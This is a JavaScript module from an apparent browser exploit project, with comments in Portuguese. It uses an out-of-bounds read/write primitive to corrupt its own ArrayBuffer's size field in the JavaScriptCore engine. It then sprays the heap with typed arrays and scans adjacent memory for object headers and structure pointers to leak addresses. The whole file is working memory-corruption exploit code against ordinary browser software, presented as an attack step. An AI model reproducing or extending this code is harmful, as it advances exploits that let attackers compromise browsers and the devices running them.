// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Este é o JSArrayBuffer
    oob_dataview_real,     // A DataView sobre ele
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v13_CorruptSelfSize";
    logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Tentativa de Corromper o Próprio Tamanho do ArrayBuffer ---`, "test", FNAME_SPRAY_INVESTIGATE);

    const NUM_SPRAY_OBJECTS = 500; // Reduzido, pois o foco não é o spray agora
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;

    let sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive(); // Cria oob_array_buffer_real e oob_dataview_real
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`oob_array_buffer_real.byteLength (inicial): ${oob_array_buffer_real.byteLength}`, "info", FNAME_SPRAY_INVESTIGATE);

        // TENTATIVA DE CORROMPER O TAMANHO DO PRÓPRIO oob_array_buffer_real
        // Assumindo que oob_array_buffer_real (JSArrayBuffer) está no início da memória acessível
        // pela oob_dataview_real (que é o caso pela definição em triggerOOB_primitive).
        // O offset do tamanho é a partir do início do objeto JSArrayBuffer.
        const self_size_offset = JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START; // 0x18
        const new_corrupted_size = 0x7FFFFFFF; // Um tamanho grande, mas positivo para 32 bits

        logS3(`Tentando corromper o tamanho do oob_array_buffer_real no offset ${toHex(self_size_offset)} para ${toHex(new_corrupted_size)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        try {
            // LEIA ANTES DE ESCREVER (para depuração)
            let original_size_field = oob_read_absolute(self_size_offset, 4);
            logS3(`   Valor original no offset do tamanho (${toHex(self_size_offset)}): ${toHex(original_size_field)} (Decimal: ${original_size_field})`, 'info', FNAME_SPRAY_INVESTIGATE);
            if (original_size_field !== oob_array_buffer_real.byteLength && original_size_field !== 0) {
                 logS3(`   AVISO: Valor original no campo de tamanho (${toHex(original_size_field)}) não corresponde ao byteLength (${oob_array_buffer_real.byteLength})!`, 'warn', FNAME_SPRAY_INVESTIGATE);
            }

            oob_write_absolute(self_size_offset, new_corrupted_size, 4); // Escreve como Uint32
            logS3(`   Tamanho do oob_array_buffer_real supostamente corrompido.`, 'good', FNAME_SPRAY_INVESTIGATE);

            // Verificar se o byteLength percebido pelo JS mudou (improvável, mas vale a pena logar)
            logS3(`   oob_array_buffer_real.byteLength (após tentativa de corrupção): ${oob_array_buffer_real.byteLength}`, 'info', FNAME_SPRAY_INVESTIGATE);
            logS3(`   oob_dataview_real.byteLength (após tentativa de corrupção): ${oob_dataview_real.byteLength}`, 'info', FNAME_SPRAY_INVESTIGATE);
            // O importante é se a DataView agora pode *operar* até o novo tamanho internamente.

        } catch (e) {
            logS3(`Erro ao tentar corromper o próprio tamanho: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
            // Prosseguir mesmo assim para ver se o escaneamento OOB funciona
        }

        // 1. Heap Spraying (menos relevante se o foco é expandir o oob_array_buffer_real)
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
            arr[0] = (0xFACE0000 | i);
            sprayedVictimObjects.push(arr);
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(200);

        // 2. Tentativa de Escaneamento Out-Of-Bounds (após o oob_array_buffer_real)
        logS3(`FASE 2: Tentando leitura Out-Of-Bounds (começando em offset ${toHex(OOB_CONFIG.ALLOCATION_SIZE)})...`, "info", FNAME_SPRAY_INVESTIGATE);
        
        const jscell_sid_offset = JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; 
        const jscell_flags_offset = JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET;   
        const jscell_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; 

        // O início do scan é o tamanho original do buffer. Se a corrupção do tamanho funcionou,
        // deveríamos ser capazes de ler além disso sem RangeError.
        const oob_scan_start_offset_in_dataview = OOB_CONFIG.ALLOCATION_SIZE; // Tamanho original
        const oob_scan_length = 8192; // Escanear 8KB "OOB"
        let objectsFoundCount = 0;
        let rangeErrorHit = false;

        for (let i = 0; i < oob_scan_length; i += 8) { 
            let current_potential_jscell_start = oob_scan_start_offset_in_dataview + i;
            let shouldLogDetails = (objectsFoundCount < 10 && i < 512) || (i % 1024 === 0);

            try {
                let val_sid = oob_read_absolute(current_potential_jscell_start + jscell_sid_offset, 4);
                let val_flags = oob_read_absolute(current_potential_jscell_start + jscell_flags_offset, 4);
                let val_struct_ptr = oob_read_absolute(current_potential_jscell_start + jscell_structure_ptr_offset, 8); 

                if (shouldLogDetails) {
                     logS3(`OOB Scan @ DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'info', FNAME_SPRAY_INVESTIGATE);
                }

                if ((val_sid !== 0 || val_flags !== 0) && !val_struct_ptr.equals(AdvancedInt64.Zero) && val_struct_ptr.high() !== 0) { 
                    logS3(`OBJETO POTENCIAL Encontrado em DV_Base+${toHex(current_potential_jscell_start)}: SID=${toHex(val_sid)}, Flags=${toHex(val_flags)}, Struct*=${val_struct_ptr.toString(true)}`, 'leak', FNAME_SPRAY_INVESTIGATE);
                    objectsFoundCount++;
                    if (objectsFoundCount >= 20) { 
                        logS3("Muitos objetos potenciais encontrados, parando o log detalhado.", "warn", FNAME_SPRAY_INVESTIGATE);
                    }
                }
            } catch (e) {
                if (shouldLogDetails || i === 0) { 
                    logS3(`OOB Scan Error @ DV_Base+${toHex(current_potential_jscell_start)}: ${e.message}`, 'warn', FNAME_SPRAY_INVESTIGATE);
                }
                if (e.message.toLowerCase().includes("out of bounds") || e.name.toLowerCase().includes("rangeerror")) { 
                    logS3("RangeError atingido durante o escaneamento OOB. A corrupção do tamanho pode não ter funcionado como esperado. Parando scan.", "error", FNAME_SPRAY_INVESTIGATE);
                    rangeErrorHit = true;
                    break; 
                }
            }
        }
        if (!rangeErrorHit) {
            logS3("Escaneamento OOB concluído sem RangeError explícito (ou atingiu o limite de scan_length).", "good", FNAME_SPRAY_INVESTIGATE);
        }
        logS3("FASE 2: Escaneamento Out-Of-Bounds Concluído.", "info", FNAME_SPRAY_INVESTIGATE);

        logS3("Investigação concluída.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = "Spray & CorruptSelfSize FALHOU!";
    } finally {
        sprayedVictimObjects = []; 
        clearOOBEnvironment();
        logS3(`--- Investigação com Spray (${FNAME_SPRAY_INVESTIGATE}) Concluída ---`, "test", FNAME_SPRAY_INVESTIGATE);
    }
}
